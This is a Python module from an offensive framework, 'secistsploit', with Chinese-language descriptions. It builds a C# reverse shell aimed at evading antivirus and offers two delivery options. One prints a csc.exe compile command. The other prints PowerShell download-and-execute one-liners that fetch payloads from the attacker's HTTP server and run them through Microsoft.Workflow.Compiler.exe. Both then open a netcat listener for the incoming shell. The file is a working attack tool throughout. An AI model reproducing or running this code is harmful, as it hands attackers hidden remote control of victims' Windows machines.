# -*- coding:utf-8 -*-
import os, sys
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient
class Exploit(TCPClient):
    __info__ = {
        "name": "csharp_reverse_nc",
        "\033[91m内容描述\033[0m": "csharp_reverse_nc模块叙述：\n"
                        "模块是使用C＃代码在目标计算机上打开一个简单的反向shell并绕过AV解决方案\n",

        "\033[91m参考链接\033[0m": (
             "https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15\n",
             "https://gist.githubusercontent.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f/raw/7806b5c9642bdf39365c679addb28b6d19f31d76/PowerShell_Command.txt\n",
             "https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066\n"
             "http://www.ggsec.cn/csharp-reverse.html\n"
        ),

        "\033[91m作者\033[0m": (
            "Demon",
        ),
    }
    lhost = OptIP("", "开启HTTP 填写本机IP")
    lport = OptPort(4444, "本地监听端口")
    target = OptString("", "1.c#编译exe  2.powershell下载并执行   (栗子 => target 1)")

    def run(self):
        TARGET=(self.target)
        LPORT=(self.lport)
        LHOST=(self.lhost)
        if TARGET =="1":
            file=os.getcwd()+'/secistsploit/data/windows/csharp/Rev_Shell.cs'
            cs=open("%s"%file,"r")
            cs2=open("Rev_Shell.cs","w")
            for s in cs.readlines():
                cs2.write(s.replace("\"192.168.10.125\", 4444","\"%s\", %s"%(LHOST ,LPORT)))
            cs.close()
            cs2.close()
            print ("\033[92m[+]\033[0m  客户端输出路径:  "+os.getcwd()+"/Rev_Shell.cs \n")
            print('''
\033[92m[+]\033[0m  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:exe /out:client.exe Rev_Shell.cs
    (运行client.exe)
            ''')
            platform=sys.platform   #判断获取操作系统
            if  platform == "darwin":
                os.system ("nc -l %s"%LPORT)
            elif platform == "linux":
                os.system ("nc -lvvp %s"%LPORT)
            os.remove('Rev_Shell.cs')
        elif TARGET =="2":
            file=os.getcwd()+'/secistsploit/data/windows/csharp/Rev.Shell'
            ps=open("%s"%file,"r")
            ps2=open("Rev.Shell","w")
            for s in ps.readlines():
                ps2.write(s.replace("\"192.168.10.125\", 4444","\"%s\", %s"%(LHOST ,LPORT)))
            ps.close()
            ps2.close()

            print ('''
    64bit:
\033[92m[+]\033[0m  (New-Object Net.WebClient).DownloadFile('http://%s:8080/secistsploit/data/windows/csharp/REV.txt', '.\REV.txt');(New-Object Net.WebClient).DownloadFile('http://%s:8080/Rev.Shell', '.\Rev.Shell');C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

    32bit:
\033[92m[+]\033[0m  (New-Object Net.WebClient).DownloadFile('http://%s:8080/secistsploit/data/windows/csharp/REV.txt', '.\REV.txt') ;(New-Object Net.WebClient).DownloadFile('http://%s:8080/Rev.Shell', '.\Rev.Shell');C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell \n
使用Ctrl+z中断 nc监听
            '''%(LHOST, LHOST, LHOST, LHOST))
            os.system ("python -m SimpleHTTPServer 8080  &")
            platform=sys.platform   #判断获取操作系统
            if  platform == "darwin":
                os.system ("nc -l %s"%LPORT)
            elif platform == "linux":
                os.system ("nc -lvvp %s"%LPORT)
            os.system('ps -ef | grep "python -m SimpleHTTPServer"| grep -v grep | awk \'{print $2}\' | xargs kill -9 ')
            os.remove('Rev.Shell')
